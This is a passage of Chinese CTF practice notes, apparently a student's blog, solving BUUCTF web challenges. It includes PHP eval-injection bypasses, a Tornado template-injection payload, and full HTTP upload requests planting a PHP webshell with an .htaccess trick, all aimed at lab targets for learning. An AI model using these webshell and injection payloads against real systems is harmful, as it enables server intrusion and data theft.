2019]BuyFlag</h1><p>感觉我心还是太急了，没发现cooki，没试一下用bp抓包，就上网找wp了，明明是很标准的流程，，，，，<br>一开始发现要post上传password，但是没发先有cookie一直回显要求的账户，把cookie改为1即可，<br>然后到密码，试了“404”，不行。看wp，用php弱比较，上传404a，显示能过不是纯数值这关，然后到弱比较，如果比较的变量开头是数字，会把数字截取到遇到字符为止，所以404a会变成404。<br>然后到了money，试了了一下，不能传太长的数值，所以用科学计数法传了9亿，拿到flag </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST /<br><span class="hljs-attribute">cookie</span>=1<br><br><span class="hljs-attribute">password</span>=404aa&amp;money=9e8<br></code></pre></td></tr></table></figure><hr><h2 id="title-note-31date-2025-04-27-20-24-35tags-web"><a href="#title-note-31date-2025-04-27-20-24-35tags-web" class="headerlink" title="title: note-31date: 2025-04-27 20:24:35tags: web"></a>title: note-31<br>date: 2025-04-27 20:24:35<br>tags: web</h2><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>进去后是个页面，输入计算式，计算结果，没见过类似的题目啊,f12，发现有个calu.php,访问得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误报告</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-comment">//如果num未被设置则显示源码</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后看别人的wp做<br><a href="https://blog.csdn.net/vanarrow/article/details/107976892">https://blog.csdn.net/vanarrow/article/details/107976892</a><br><a href="https://www.cnblogs.com/echoDetected/p/13091486.html">https://www.cnblogs.com/echoDetected/p/13091486.html</a>  </p><p>当传入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> num<br><span class="hljs-comment">//就能绕过正则匹配？</span><br><span class="hljs-comment">//此时的&quot;nmu&quot;不等于&quot; num&quot;,绕过了：</span><br><br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br><br><span class="hljs-comment">//但是在eval里解析的时候会把空格移除，这样就能实现绕过</span><br></code></pre></td></tr></table></figure><p>在本地试了一下，确实是这样:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo&#x27;</span>. <span class="hljs-title function_ invoke__">phpinfo</span>().<span class="hljs-string">&#x27;;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo&#x27;</span>.<span class="hljs-string">&#x27; phpinfo()&#x27;</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接下来总结别人的wp：<br>1.用” num”来绕过正则匹配；<br>2.var_dump函数来输出回显，用file_get_contents()来加载flag文件chr()函数来绕过非法字符；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;&#x27;</span><br>s=s+<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter you str,then i will give you them ascii:\n&quot;</span>)<br>o=<span class="hljs-number">0</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    o=<span class="hljs-built_in">ord</span>(i)<br>    <span class="hljs-built_in">print</span>(o)<br></code></pre></td></tr></table></figure><p>然后到做题：<br>查看根目录：</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sml">/calc.php? num=var_dump(scandir(chr(<span class="hljs-number">47</span>)))<br><br>回显：<br><span class="hljs-built_in">array</span>(<span class="hljs-number">24</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;.dockerenv&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;bin&quot;</span> [<span class="hljs-number">4</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;boot&quot;</span> [<span class="hljs-number">5</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;dev&quot;</span> [<span class="hljs-number">6</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;etc&quot;</span> [<span class="hljs-number">7</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;f1agg&quot;</span> [<span class="hljs-number">8</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;home&quot;</span> [<span class="hljs-number">9</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;lib&quot;</span> [<span class="hljs-number">10</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;lib64&quot;</span> [<span class="hljs-number">11</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;media&quot;</span> [<span class="hljs-number">12</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;mnt&quot;</span> [<span class="hljs-number">13</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;opt&quot;</span> [<span class="hljs-number">14</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;proc&quot;</span> [<span class="hljs-number">15</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;root&quot;</span> [<span class="hljs-number">16</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;run&quot;</span> [<span class="hljs-number">17</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;sbin&quot;</span> [<span class="hljs-number">18</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;srv&quot;</span> [<span class="hljs-number">19</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;start.sh&quot;</span> [<span class="hljs-number">20</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;sys&quot;</span> [<span class="hljs-number">21</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;tmp&quot;</span> [<span class="hljs-number">22</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;usr&quot;</span> [<span class="hljs-number">23</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;var&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>读取flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node5.buuoj.cn:<span class="hljs-number">28453</span>/calc.php?%<span class="hljs-number">20</span>num=var_dump(file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)))<br><br><span class="hljs-attribute">string</span>(<span class="hljs-number">43</span>) <span class="hljs-string">&quot;flag&#123;89404a0c-0948-4a18-9f87-40f1050cc23f&#125; &quot;</span><br></code></pre></td></tr></table></figure><h2 id="notice-4"><a href="#notice-4" class="headerlink" title="notice:"></a>notice:</h2><p>scandir( )<br>这是一个在C语言中用于扫描目录内容的函数，它允许开发者检索目录中的文件和子目录信息。这个函数在Linux系统编程中非常有用，尤其是当你需要处理文件系统或者进行目录操作时。</p><p>var_dump( )：<br>这是PHP的一个内置函数，用于输出变量的详细信息，包括类型和值。</p><p>file_get_contents( )：<br>这是PHP的一个内置函数，用于读取文件内容并返回为字符串。</p><p>chr( )：<br>这是PHP的一个内置函数，用于将ASCII码值转换为对应的字符。</p><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>模板注入题<br>没接触过，想直接去看wp了<br><a href="https://blog.csdn.net/m0_73734159/article/details/134360691">https://blog.csdn.net/m0_73734159/article/details/134360691</a><br>很详细，  </p><p>记一回tornado模板注入，虽然没做过两道模板注入的题  </p><p>点开flag看到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">/flag.txt<br>flag <span class="hljs-keyword">in</span> /fllllllllllllag<br><br>url:/file?filename=/flag.txt&amp;filehash=02521e013bf12f2ed07267cbbb4476da<br></code></pre></td></tr></table></figure><p>修改filehash:<br>&#x2F;error?msg&#x3D;Error<br>验证完后确定使用tornado模板注入（wp）  </p><p>查看hint得到计算公式 md5(cookie_secret+md5(filename))<br>知道要拿到cookie_secret,<br>用handler.sttings查看环境变量  </p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;<span class="hljs-number">42b45411</span>-b944-<span class="hljs-number">4058</span>-a294-92333eecacef&#x27;&#125;<br></code></pre></td></tr></table></figure><p>计算hash值<br>md5(&#x2F;fllllllllllllag)&#x3D;3bf9f6cf685a6dd8defadabfb41a03a1<br>cookie_secret&#x3D;42b45411-b944-4058-a294-92333eecacef<br>md5(md5(&#x2F;fllllllllllllag)+cookie_secret)&#x3D;baf2694028f23612a3c77cb63b9b9dd8</p><p>最后payload：<br>&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;baf2694028f23612a3c77cb63b9b9dd8</p><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>这题的note写过了，本替换搞没了，这次就独立做过当温习吧<br>开局艾克和孙笑川，jpeg直接传也传不了，文件有1m限制，<br>题目一直不提示改上传什么类型的文件有点难受，<br>最后试出来mmie传 image&#x2F;png 就行<br>直接传了  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>411<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryPX5AuupbBQqkGiE6<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=40c31c5302fc21595b5a1fb9e36ac7ff<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;php.png&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">一键去世</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6--</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-built_in">Warning</span>: mkdir(): File <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> /var/www/html/upload.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">23</span></span><br><span class="language-pgsql">/var/www/html/upload/c27817d096552162de80b210a4855ce1/php.png succesfully uploaded!</span><br></code></pre></td></tr></table></figure><p>直接蚁剑访问访问不了，应该就是目录不会进行php解析的原因<br>利用.htaccess,上传.htaccess文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>340<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryvBTzoKhzTjekoPjH<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=40c31c5302fc21595b5a1fb9e36ac7ff<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">SetHandler application/x-httpd-php</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">一键去世</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH--</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-built_in">Warning</span>: mkdir(): File <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> /var/www/html/upload.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">23</span></span><br><span class="language-pgsql">/var/www/html/upload/c27817d096552162de80b210a4855ce1/.htaccess succesfully uploaded!</span><br></code></pre></td></tr></table></figure><p>蚁剑访问<br><a href="http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/upload/c27817d096552162de80b210a4855ce1/php.png">http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/upload/c27817d096552162de80b210a4855ce1/php.png</a><br>成功  </p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>漏洞详情：<br><a href="https://blog.csdn.net/weixin_44032232/article/details/108998564">https://blog.csdn.net/weixin_44032232/article/details/108998564</a></p><h1 id="ACTF-upload（未解出）"><a href="#ACTF-upload（未解出）" class="headerlink" title="ACTF upload（未解出）"></a>ACTF upload（未解出）</h1><p>又跑去actf坐牢了😭，做不出来也把进度放这</p><p>先要注册用户来登录，试了admin账户，服务器不给  </p><p>传正常图片<br><a href="http://223.112.5.141:63478/upload?file_path=9db39573-994f-464f-b1fe-97c1e9897fb9_test.jpeg">http://223.112.5.141:63478/upload?file_path=9db39573-994f-464f-b1fe-97c1e9897fb9_test.jpeg</a><br>访问正常回显图片  </p><p>传马：<br><a href="http://223.112.5.141:63478/upload?file_path=5ce41be5-7154-493f-b21b-84dd6a200111_php.php">http://223.112.5.141:63478/upload?file_path=5ce41be5-7154-493f-b21b-84dd6a200111_php.php</a><br>不回显代码，回显：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png;base64,PHNjcmlwdCBsYW5ndWFnZT0ncGhwJz5ldmFsKCRfR0VUWyJ6Il0pOzwvc2NyaXB0Pg==&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Uploaded Image&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>是base64编码后的马<br>试一下直接上传base64：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+<br></code></pre></td></tr></table></figure><p>不行  </p><p>看一下d导的分析：  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml">关键分析<br>服务器处理逻辑：<br><br>上传的内容被包裹在 <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png;base64,...&quot;</span>&gt;</span> 中，说明服务器将文件内容强制转换为 Base64 图片。<br><br>但返回的 Base64 数据 (PHNjcmlwdCBsYW5ndWFnZT0ncGhwJz5ldmFsKCRfR0VUWyJ6Il0pOzwvc2NyaXB0Pg==) 解码后正是你上传的原始代码：<br><br>php<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&quot;z&quot;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>这意味着服务器可能同时做了两件事：<br><br>将文件内容保存到磁盘（如 uploads/shell.php）。<br><br>生成一个包含该内容的 Base64 图片用于前端展示。<br><br>潜在漏洞点：<br><br>如果服务器保存了原始文件（如 .php），且文件名可控，可直接访问该文件执行代码。<br><br>如果服务器仅返回 Base64 图片但未保存原始文件，需另寻他法。<br></code></pre></td></tr></table></figure><p>试一下对upload文件  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">223.112</span>.<span class="hljs-number">5.141</span>:<span class="hljs-number">63478</span><span class="hljs-regexp">/upload?file_path=flag.txthttp:/</span><span class="hljs-regexp">/223.112.5.141:63478/u</span>pload?file_path=flag.txt<br></code></pre></td></tr></table></figure><p>对upload试了一下目录穿越，不行，  </p><p>伪协议<br>encode，无法读取文件，<br>decode，无法读取文件</p><p>注意到无论上传什么文件服务器默认当作imag&#x2F;png文件处理</p><p><a href="http://223.112.5.141:53908/upload?file_path=http://127.0.0.1/flag.txt">http://223.112.5.141:53908/upload?file_path=http://127.0.0.1/flag.txt</a><br>不行<br>放弃了，等wp  </p><hr><h2 id="title-note-32date-2025-05-01-02-13-13tags-web"><a href="#title-note-32date-2025-05-01-02-13-13tags-web" class="headerlink" title="title: note-32date: 2025-05-01 02:13:13tags: web"></a>title: note-32<br>date: 2025-05-01 02:13:13<br>tags: web</h2><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>buucft里提示有sql，上来给了个输入框，但是是post而，抓包看：  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span><br><span 